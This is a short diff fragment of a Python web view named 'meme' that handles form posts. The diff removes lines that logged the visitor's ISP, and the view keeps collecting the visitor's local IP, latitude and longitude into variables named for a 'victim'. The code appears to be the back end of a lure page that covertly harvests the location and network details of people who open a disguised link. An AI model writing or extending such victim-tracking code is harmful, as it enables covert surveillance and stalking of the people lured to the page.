@@ -442,9 +442,6 @@ def meme(request, username):
   elif request.method == 'POST':
     username = username
     localip = str(request.POST.get('locip'))
-    if request.POST.get('isp') != None:
-      print(request.POST.get('isp'))
-      victimisp = request.POST.get('isp')
     viclatitude = str(request.POST.get('latitude'))
     viclongitude = str(request.POST.get('longitude'))
   
